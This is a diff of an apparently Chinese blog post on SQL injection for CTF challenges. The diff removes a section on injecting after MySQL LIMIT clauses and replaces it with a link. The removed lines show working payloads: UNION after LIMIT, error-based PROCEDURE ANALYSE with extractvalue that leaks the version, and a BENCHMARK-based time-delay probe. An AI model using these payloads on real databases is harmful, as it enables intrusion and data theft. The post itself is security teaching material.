@@ -732,7 +732,7 @@
                 
               
 
-              <time title="创建时间：2019-10-17 11:19:53 / 修改时间：16:26:25" itemprop="dateCreated datePublished" datetime="2019-10-17T11:19:53+08:00">2019-10-17</time>
+              <time title="创建时间：2019-10-17 11:19:53 / 修改时间：16:38:35" itemprop="dateCreated datePublished" datetime="2019-10-17T11:19:53+08:00">2019-10-17</time>
             </span>
           
 
@@ -850,38 +850,8 @@
 <p><img src="http://img.mp.itc.cn/upload/20170718/d19adf2898a94ece9e49088dfae47424_th.jpg" alt="img"></p>
 <p>这样估计都明白了，一个可以放在盲注语句中盲打的套路，在过滤严格无法盲注的情况下，同样可以放在where子句后面进行爆破：</p>
 <p><img src="http://img.mp.itc.cn/upload/20170718/75d7b7b180954c598874667e8582e440_th.jpg" alt="img"></p>
-<h4 id="不存在-order-by-关键字"><a href="#不存在-order-by-关键字" class="headerlink" title="不存在 order by 关键字"></a>不存在 order by 关键字</h4><p>执行语句</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; select id from users limit 0,1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>这种情况下的 <code>limit</code> 后面可以使用<code>union</code>进行联合查询注入<br>执行语句</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; select id from users limit 0,1 union select username from users;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-968e604f601fb341.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790/format/webp" alt="img"></p>
-<h4 id="存在-order-by-关键字"><a href="#存在-order-by-关键字" class="headerlink" title="存在 order by 关键字"></a>存在 order by 关键字</h4><p>执行语句</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; select id from users order by id desc limit 0,1;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>此时后面再次使用<code>union</code>将会报错</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-159c5b1ad1b6fc42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/972/format/webp" alt="img"></p>
-<p>除了<code>union</code> 就没有其他可以使用的了吗，非也<br>此方法适用于<code>5.0.0&lt; MySQL &lt;5.6.6</code>版本，在limit语句后面的注入<br>MySQL 5中的SELECT语法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ] </span><br><span class="line">      [<span class="keyword">HIGH_PRIORITY</span>] </span><br><span class="line">      [<span class="keyword">STRAIGHT_JOIN</span>] </span><br><span class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>] </span><br><span class="line">      [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>] </span><br><span class="line">    select_expr [, select_expr ...] </span><br><span class="line">    [<span class="keyword">FROM</span> table_references </span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition] </span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125; </span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]] </span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition] </span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125; </span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...] </span><br><span class="line">    [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;] </span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)] </span><br><span class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options </span><br><span class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span> </span><br><span class="line">      | <span class="keyword">INTO</span> var_name [, var_name]] </span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure>
-
-<p>limit 关键字后面还可跟<code>PROCEDURE</code>和 <code>INTO</code>两个关键字，但是 <code>INTO</code> 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以<code>PROCEDURE</code>为例进行注入</p>
-<ul>
-<li>使用 <code>PROCEDURE</code>函数进行注入<br>ANALYSE支持两个参数，首先尝试一下默认两个参数</li>
-</ul>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id from users order by id desc limit <span class="number">0</span>,<span class="number">1</span> <span class="function">procedure <span class="title">analyse</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line">ERROR <span class="number">1386</span> (HY000): Can't use ORDER clause with <span class="keyword">this</span> procedure</span><br></pre></td></tr></table></figure>
-
-<p>报错，尝试一下对其中一个参数进行注入，这里首先尝试报错注入</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> users order <span class="keyword">by</span> id desc limit <span class="number">0</span>,<span class="number">1</span> <span class="function">procedure <span class="title">analyse</span>(<span class="params">extractvalue(rand(</span>),<span class="title">concat</span>(<span class="params"><span class="number">0x3a</span>,version(</span>))),1)</span>;</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">':5.5.53'</span></span><br></pre></td></tr></table></figure>
-
-<p>成功爆出 mysql 版本信息，证明如果存在报错回显的话，可以使用报错注入在<code>limit</code>后面进行注入<br>不存在回显怎么办，延迟注入呀<br>执行命令</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>如果 <code>select version();</code> 第一个为5，则多次执行sha(1)达到延迟效果<br>这里使用 sleep 进行尝试，但均未成功，所以需要使用BENCHMARK进行替代</p>
+<p>limit注入</p>
+<p><a href="https://www.jianshu.com/p/6c1420a7a7d9" target="_blank" rel="noopener">https://www.jianshu.com/p/6c1420a7a7d9</a></p>
 <p>总结</p>
 <p>CTF中的SQL注入就是一个bypass与waf的斗争历程。一个的常用函数，一个的常用套路，经过多个之间巧妙的组合，总会出来bypass的更好更优美的姿势。</p>
 
